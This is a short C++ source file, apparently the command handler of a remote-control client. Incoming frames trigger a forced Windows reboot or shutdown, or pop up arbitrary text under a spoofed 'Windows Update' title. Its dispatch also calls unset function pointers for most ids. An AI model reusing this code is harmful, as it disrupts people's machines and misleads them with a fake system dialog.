#include <ParseCmds.hh>

ParseCmds::ParseCmds()
{
	this->_cmds[13] = &ParseCmds::sendSignal;
	this->_cmds[23] = &ParseCmds::popMsg;
}

ParseCmds::~ParseCmds()
{
}

void ParseCmds::execute(const t_trame & trame)
{
	char toto[200];
	sprintf(toto, "%d %d\n", trame.id, trame.data[0]);
	OutputDebugString(toto);
	if (trame.id > 1 && trame.id <= 23)
		(this->*_cmds[trame.id])(trame.data);
}

void ParseCmds::sendSignal(const char * data)
{
	switch (data[0])
	{
	case '0':
		ExitWindows(EWX_REBOOT, EWX_FORCE);
		break;
	case '1':
		ExitWindows(EWX_SHUTDOWN, EWX_FORCE);
		break;
	case '2':
		//SetSuspendState(false, false, false);
		break;
	default:
		break;
	}
}

void ParseCmds::popMsg(const char *data)
{
	MessageBox(NULL, data, "Windows Update", MB_OK);
}
